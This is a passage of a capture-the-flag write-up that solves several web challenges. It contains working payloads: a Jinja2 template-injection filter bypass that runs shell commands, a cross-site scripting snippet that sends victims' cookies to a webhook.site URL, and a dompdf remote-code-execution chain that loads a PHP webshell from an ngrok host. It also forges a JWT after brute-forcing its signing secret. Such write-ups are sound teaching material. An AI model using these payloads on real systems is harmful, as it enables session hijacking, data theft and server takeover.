I was unable to find the same capture on Google Maps, but since this is an arial view, we can get a pretty good idea where it might be without too much trouble.


`flag{2e57cfe16d7e1c5431aa3b99d0e713cb}`

## Web
### Hidden Figures
>Author: @JohnHammond#6971  
>  
>Look at this fan page I made for the Hidden Figures movie and website! Not everything is what it seems!
----------------------------------------------
Entering the website we see a pretty well-constructed page promoting `Hidden Figures`, a pretty popular book/movie. None of the links take us to other pages, so there is little to be explored.
Early on, I noticed that folder directory `/assets/` is free to view. I thought perhaps there might be something hidden here, or in another commonly used folder type? 

![Pasted image 20230616185356.png](images/20230616185356.png)

After some lengthy enumeration, I found nothing of interest.

Looking at the page source, I noticed that there are several links with *very* long url codes:
```
data:image/png;base64,/9j/4AAQSkZJRgABAQEBLAEsAAD/7RqcUGhvdG9zaG9wIDMuMAA4QklNBAQAAAAAAFocAVoAAxslRxwCAAACAAAcAngAFVdvbWFuIG9mIE5BU0EgTGFuZ2xleRwCVQAPRGF2aWQgQy4gQm93bWFuHAI3AAgyMDE0MDMyMBwCPAALMDkxNTA2KzAwMDA4QklNBCUAAAAAABBbRWm4H1TKYVo1ObYsy6/POEJJTQQ6AAAAAAESAAAAEAAAAAEAAAAAAAtwcmludE91dHB1dAAAAAUAAAAAUHN0U2Jvb2wBAAAAAEludGVlbnVtAAAAAEludGUAAAAASW1nIAAAAA9wcmludFNpeHRlZW5CaXRib29sAAAAAAtwcmludGVyTmFtZVRFWFQAAAAWAEUAUABTAE8ATgAgAFMAdAB5AGwAdQBzACAAUAByAG8AIAA3ADkAMAAwAAAAAAAPcHJpbnRQcm9vZlNldHVwT2JqYwAAAAwAUAByAG8AbwBmACAAUwBlAHQAdQBwAAAAAAAKcHJvb2ZTZXR1cAAAAAEAAAAAQmx0bmVudW0AAAAMYnVpbHRpblByb29mAAAADHByb29mTW9uaXRvcjhCSU0EOwAAAAACLQAAABAAAAABAAAAAAAScHJpbnRPdXRwdXRPcHRpb25zAAAAFwAAAABDcHRuYm9vbAAAAAAAQ2xicmJvb2wAAAAAAFJnc01ib29sAAAAAABDcm5DYm9vbAAAAAAAQ250Q2Jvb2wAAAAAAExibHNib29sAAAAAABOZ3R2Ym9vbAAAAAAARW1sRGJvb2wAAAAAAEludHJib29sAAAAAABCY2tnT2JqYwAAAAEAAAAAAABSR0JDAAAAAwAAAABSZCAgZG91YkBv4AAAAAAAAAAAAEdybiBkb3ViQG/gAAAAAAAAAAAAQmwgIGRvdWJAb+AAAAAAAAAAAA
<...SNIP...>
```
And so on. I didn't know this was possible or ever really done, but it appears that some websites might provide their images in base64 encoded data like this so that images can be loaded without retrieving data from other pages. This seems to be what is going on here, as following the link takes me to an image regardless of the website's running state.

Eventually I thought to download each of the images located on the website. While reviewing this challenge I discovered that saving the image directly is enough, but at the time I had decided to copy/paste the entire url into a file. After removing `data:image/png;base64,` I base64 decoded the info:

```
$ cat url | base64 -d > decode_url 
```

And so on, for all 4 images found.

Checking `exiftool` didn't give me any critical information, however `binwalk` did show me something *hidden* in the figures.

```bash
$ binwalk decode_url2

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
15486         0x3C7E          PNG image, 1851 x 174, 8-bit/color RGB, non-interlaced
15527         0x3CA7          Zlib compressed data, default compression
```

There is another image hidden here, and potentially some compressed data?
Extracting with binwalk:

```bash
$ binwalk -D=".*" decode_url2

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
15486         0x3C7E          PNG image, 1851 x 174, 8-bit/color RGB, non-interlaced
15527         0x3CA7          Zlib compressed data, default compression
```

Viewing the hidden PNG image:

![Pasted image 20230617121633.png](images/20230617121633.png)

`flag{e62630124508ddb3952843f183843343}`

### Marmalade 5
>Author: @congon4tor#2334  
>  
>Enjoy some of our delicious home made marmalade!
------------------------
We are prompted to choose a username to log in. No password asked. Firstly trying admin, of course we are not allowed. So I go with my old friend `asdf`.


![Pasted image 20230615153302.png](images/20230615153302.png)

On login, it tells us that only admin can see the flag:

![Pasted image 20230616173145.png](images/20230616173145.png)

With how little content is on these pages, there is pretty much nothing else to consider other than editing the given cookie:
`token=eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImFzZGYifQ.SKkdg9_2EbXj67FcZNnXIg`
Based on the cookie having 3 sections separated by dots, I immediately recognize this as a JWT. Using jwt.io to decode:

![Pasted image 20230616173339.png](images/20230616173339.png)

The blue segment is a signature hashed with a secret key to prevent forgery, but this is not always used to verify. Perhaps we can just edit the Payload section so that our username is admin?
```
{
  "username": "admin"
}
```
Converting back to base64, our new token looks like this
`eyJhbGciOiJNRDVfSE1BQyJ9.ewogICJ1c2VybmFtZSI6ICJhZG1pbiIKfQ.SKkdg9_2EbXj67FcZNnXIg`

When I edit the cookie, it gives me an interesting new error:

![Pasted image 20230616173646.png](images/20230616173646.png)

```
# Bad Request

Invalid signature, we only accept tokens signed with our MD5_HMAC algorithm using the secret fsrwjcfszeg*****
```

So while they are checking the token signatures, they did a bit of an oopsie and gave away most of their secret key!! Only the last 5 characters are hidden, making this secret key effectively 5 characters in length. This is something that can be brute-forced rather easily.

I used python to quickly generate a wordlist containing the known secret string, then appended all possible 5 letter combinations:
```python
fp = open("wordlist.txt", "w")

for i in range(ord('a'), ord('z') + 1):
    for j in range(ord('a'), ord('z') + 1):
        for k in range(ord('a'), ord('z') + 1):
            for l in range(ord('a'), ord('z') + 1):
                for m in range(ord('a'), ord('z') + 1):
                    fp.write('fsrwjcfszeg' + chr(i) + chr(j) + chr(k) + chr(l) + chr(m) +  "\n");

fp.close()
```

From this point, I can use my previously valid JWT for asdf, and use `John the Ripper` to brute force the secret key. John will accept the token when the signature is presented in hex, however I had trouble converting myself for some reason. This issue was resolved once I used [Sjord's jwtcrack code](https://github.com/Sjord/jwtcrack/blob/master/jwt2john.py) to recreate my token.

```shell
$ python convert.py 'eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImFzZGYifQ.SKkdg9_2EbXj67FcZNnXIg'
eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImFzZGYifQ#48a91d83dff611b5e3ebb15c64d9d722
```

Cracking the secret with john:

```shell
$ john jwt.txt --wordlist=wordlist.txt --format=HMAC-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-MD5 [password is key, MD5 256/256 AVX2 8x3])
Warning: poor OpenMP scalability for this hash type, consider --fork=2
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
fsrwjcfszegvsyfa (?)     
1g 0:00:00:04 DONE (2023-06-16 13:39) 0.2487g/s 2472Kp/s 2472Kc/s 2472KC/s fsrwjcfszegvsxlg..fsrwjcfszegvtppv
Use the "--show --format=HMAC-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

The secret key is `fsrwjcfszegvsyfa`
Now to generate a valid signature for our forged jwt. Using the first 2 base64 encoded segments, we perform HMAC-MD5 hashing, then convert from hex back to base64:

![Pasted image 20230616174953.png](images/20230616174953.png)

Finalized token:
```
eyJhbGciOiJNRDVfSE1BQyJ9.ewogICJ1c2VybmFtZSI6ICJhZG1pbiIKfQ.kpCxx3dVioNEfybFE2UBxg
```

Upon refreshing the page, we get the flag.

![Pasted image 20230616141001.png](images/20230616141001.png)

`flag{a249dff54655158c25ddd3584e295c3b}`

### Obligatory
>Author: @congon4tor#2334  
>  
>Every Capture the Flag competition has to have an obligatory to-do list application, right???
---------------------------------
Firstly, we are greeted with a sign-in page

![Pasted image 20230616165433.png](images/20230616165433.png)

Typical admin:admin guesses do not work, so after making a new account

![Pasted image 20230616165611.png](images/20230616165611.png)

I created a new task `asdf`, and this is the result. After exploring the POST parameters done during submission, as well as how things are altered when tasks are moved between active and completed, I did not see any interesting pattern. The most notable piece is that trashing my first task leads to `http://challenge.nahamcon.com:32053/delete?id=2`. However, `id=1` appears inaccessible. 

When I turned my attention to the greentext, I noticed in the url we see this as well:
`http://challenge.nahamcon.com:32053/?success=Task%20created`
Editing the success= component will affect what is being displayed in green. After playing for a bit, I noticed that this is actually vulnerable to SSTI:
`http://challenge.nahamcon.com:32053/?success={{7*7}}`

![Pasted image 20230616154856.png](images/20230616154856.png)

Doing actions such as `curl -v` did not give any insight on the framework being used, but exploring the SSTI a little further gave me the impression that this is likely Jinja2:
`http://challenge.nahamcon.com:32053/?success={{7*'7'}}``

![Pasted image 20230616155028.png](https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Images/Pasted%20image%2020230616155028.png)

Knowing this, I tried some simple enumerations before I find the true difficulty of this challenge:
`http://challenge.nahamcon.com:32053/?success={{config}}`

![Pasted image 20230616170342.png](https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Images/Pasted%20image%2020230616170342.png)

```
HACKER DETECTED!!!!  
The folowing are not allowed: [ {{\s*config\s*}},.*class.*,.*mro.*,.*import.*,.*builtins.*,.*popen.*,.*system.*,.*eval.*,.*exec.*,.*\..*,.*\[.*,.*\].*,.*\_\_.* ]
```

It wasn't obvious to me at first, but the real trouble is that any command containing a dot, or square brackets, is blocked.
After spending a good amount of time looking for ways to bypass the filter, I eventually ran into [this post](https://hackmd.io/@Chivato/HyWsJ31dI). Importantly, the writer manages to create a payload to bypass ".","\_", "[]", and even "|join". 

```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

Our blacklist also includes some functions that were used, which I bypassed by breaking between quotes (popen -> po''pen).

```
http://challenge.nahamcon.com:32053/?success={{request|attr(%27application%27)|attr(%27\x5f\x5fglobals\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fbuil%27%27tins\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fimp%27%27ort\x5f\x5f%27)(%27os%27)|attr(%27po%27%27pen%27)(%27id%27)|attr(%27read%27)()}}
```

![Pasted image 20230616171249.png](https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Images/Pasted%20image%2020230616171249.png)

We have successful code execution!! Now all that remains is to find the flag.

After some enumeration of where the flag might be, I began to think that perhaps there isn't a `flag.txt` file after all. When I check the contents of the cwd:
```bash
drwxr-xr-x    1 root     root          4096 Jun 14 17:54 .
drwxr-xr-x    1 root     root          4096 Jun 14 17:54 ..
drwxr-xr-x    1 uwsgi    uwsgi         4096 Jun 16 20:55 DB
-rw-r--r--    1 root     root           159 Jun 14 17:53 app.ini
-rwxr-xr-x    1 root     root          6693 Jun 14 17:53 app.py
-rw-r--r--    1 root     root           792 Jun 14 17:53 models.py
-rw-r--r--    1 root     root           138 Jun 14 17:53 requirements.txt
drwxr-xr-x    2 root     root          4096 Jun 14 17:53 templates
```
I notice the DB folder, and I recall that my task id's started at 2. Perhaps the flag is in admin's task list, for id number 1?

Looking inside the DB folder:
```
drwxr-xr-x    1 uwsgi    uwsgi         4096 Jun 16 20:55 .
drwxr-xr-x    1 root     root          4096 Jun 14 17:54 ..
-rw-r--r--    1 uwsgi    uwsgi        16384 Jun 16 20:55 db.sqlite
```

Unfortunately, opening a sqlite file is a bit tricky with the RCE that I am currently using. Moreover, dots are still blacklisted. It is fortunate that this folder only has one file, so we can use wildcard * to select `db.sqlite` without using dot. When I try `cat /usr/src/app/DB/*`:

![Pasted image 20230616172048.png](images/20230616172048.png)

It seems there are issues when trying to output invalid characters, causing the internal server error. As a last attempt, I decided to try `strings`, which should only output legitimate utf-8 friendly characters. However, it is not guaranteed that the flag could remain intact for this.

Request:
```
view-source:http://challenge.nahamcon.com:32053/?success={{request|attr(%27application%27)|attr(%27\x5f\x5fglobals\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fbuil%27%27tins\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fimp%27%27ort\x5f\x5f%27)(%27os%27)|attr(%27po%27%27pen%27)(%27strings%20/usr/src/app/DB/db*%27)|attr(%27read%27)()}}
```

Output:
```bash
tabletasktask
CREATE TABLE task (
	id INTEGER NOT NULL, 
	name VARCHAR(100), 
	completed BOOLEAN, 
	user_id INTEGER, 
	PRIMARY KEY (id), 
	CHECK (completed IN (0, 1)), 
	FOREIGN KEY(user_id) REFERENCES user (id)
tableuseruser
CREATE TABLE user (
	id INTEGER NOT NULL, 
	username VARCHAR(40), 
	password VARCHAR(50), 
	PRIMARY KEY (id), 
	UNIQUE (username)
indexsqlite_autoindex_user_1user
asdfasdf
-adminT2dUL6Z#S9KH%x%i
asdf
	admin
asdf
	flag{7b5b91c60796488148ddf3b227735979}
```

Very foturnately, the flag not only survived but is very readable!
`flag{7b5b91c60796488148ddf3b227735979}`

As a side note, we have the password for `admin` now too, and can log in.
`admin:T2dUL6Z#S9KH%x%i`

![Pasted image 20230616172852.png](images/20230616172852.png)

### Star Wars
>Author: @congon4tor#2334  
>
>If you love Star Wars as much as I do you need to check out this blog!
---------------------
Firstly comes logging in. After trying and failing a few easy guesses like admin:admin, I made my own account with username `asdf`. Upon entering we are led to a blog post:

![Pasted image 20230615231203.png](images/20230615231203.png)

We see a comment section and not much else, so of course we have to check for XSS
```
<script>alert('XSS');</script>
```

![Pasted image 20230615231619.png](images/20230615231619.png)

Our XSS was a hit, but also we can see notice that an admin should review our comment. This setup seems prime for a cookie hijack through XSS. I will use webhook.site to receive the cookie request.
```
<script>
document.write(``'<img src="https://webhook.site/538e246b-2888-428c-b201-75331cefc008?c='``+document.cookie+``'" />'``);
</script>
```

This XSS generates an image pointing to my webhook.site link, and adds the user's `document.cookie` to the end of the url. And so, when a victim views this page, the image will attempt to be loaded by visiting my webhook. The webhook will log the request information and with it, I will be able to see whatever cookies are associated with the victim's session.

![Pasted image 20230615230950.png](images/20230615230950.png)

Indeed we see a cookie: `x-wing=eyJfcGVybWFuZW50Ijp0cnVlLCJpZCI6MX0.ZIvRmQ.20AcIM9F-Kg8q21j8Pc4mVl2aO0`

By substituting our X-wing cookie for this one, we become admin. Revisiting the page, nothing has changed. After a quick directory enumeration, we can find a new page by visiting `/admin`. This is pretty guessable, although I do concede to running `feroxbuster` to point it out to me:
```bash
feroxbuster -u http://challenge.nahamcon.com:30413/
<...SNIP...>
02      GET        4l       28w      303c http://challenge.nahamcon.com:30413/admin
<...SNIP...>
```

When visiting /admin while having the token, we can find the flag.

![Pasted image 20230615230911.png](images/20230615230911.png)

`flag{a538c88890d45a382e44dfd00296a99b}`

### Stickers
>Wooohoo!!! Stickers!!! Hackers love STICKERS!! You can make your own with our new website!
>**Find the flag file in `/flag.txt` at the root of the filesystem.**
--------------
Visiting the website, there is a form to fill out custom information. Upon submitting data, we are generated a pdf webpage:

![Pasted image 20230616151436.png](images/20230616151436.png)

In particular I notice the url of the page corresponds to the data I submitted:

```
http://challenge.nahamcon.com:31182/quote.php?organisation=&email=&small=0&medium=0&large=0
```

I downloaded the pdf file and decided to see if I can glean some information on how it was generated:

```
$ exiftool quote.pdf 
ExifTool Version Number         : 12.57
File Name                       : quote.pdf
Directory                       : .
File Size                       : 2.5 kB
File Modification Date/Time     : 2023:06:16 15:15:27-04:00
File Access Date/Time           : 2023:06:16 15:15:27-04:00
File Inode Change Date/Time     : 2023:06:16 15:15:27-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.7
Linearized                      : No
Page Count                      : 1
Producer                        : dompdf 1.2.0 + CPDF
Create Date                     : 2023:06:16 19:14:20+00:00
Modify Date                     : 2023:06:16 19:14:20+00:00
Title                           : Quote
```

Immediately the producer `dompdf` stands out to me. I recognize a pretty serious vulnerability it that can lead to remote code execution [CVE-2022-28368](https://nvd.nist.gov/vuln/detail/CVE-2022-28368). 

I used [this poc post](https://github.com/positive-security/dompdf-rce) to exploit this.

Using my own `ngrok` website, I direct the payload toward myself, where it can pick up the malicious php:

```
challenge.nahamcon.com:31182/quote.php?organisation=<link rel=stylesheet href='https://91cf-50-81-86-237.ngrok-free.app/exploit.css'>&email=&small=0&medium=0&large=0
```

In the exploit_font.php, I used a simple webshell one-liner:

```shell
$ cat exploit_font.php 

� dum1�cmap
           `�,glyf5sc��head�Q6�6hhea��($hmtxD
loca
Tmaxp\ nameD�|8dum2�
                     -��-����
:83#5:08��_<�
             @�8�&۽
:8L��

:D

6                               s
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
```

The unreadable junk above seems to be related to the file being intended as a font style, so it was left unchanged. 

After the request is sent, I see two GET requests on my server, knowing that it was successfully retrieved:

```
HTTP Requests                                                                                                       
-------------                                                                                                       
                                                                                                                    
GET /exploit_font.php          200 OK                                                                               
GET /exploit.css               200 OK 
```

Now we need to determine the new name of the malicious php downloaded. While not thoroughly explained in the POC github, it appears that the name is based on the `md5sum` of the download link, in this case my ngrok link:

```
$ echo -ne "https://91cf-50-81-86-237.ngrok-free.app/exploit_font.php" | md5sum
88045a0e7631a2540434bb8c27d7d483  -

```


Now we visit the downloaded link under the format `/dompdf/lib/fonts/<font-family>_<style>_<md5(url)>.php`

```
challenge.nahamcon.com:31182/dompdf/lib/fonts/exploitfont_normal_88045a0e7631a2540434bb8c27d7d483.php?cmd=id
```

```
� dum1�cmap`�,glyf5sc��head�Q6�6hhea��($hmtxD Lloca Tmaxp\ nameD�|8dum2� -��-���� :83#5:08��_<�@�8�&۽ :8L�� :D 6    s

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We do indeed see that it works! We were told the flag is located in root of the filesystem:

```
challenge.nahamcon.com:31182/dompdf/lib/fonts/exploitfont_normal_88045a0e7631a2540434bb8c27d7d483.php?cmd=cat /flag.txt
```


`flag{a4d52beabcfdeb6ba79fc08709bb5508}`

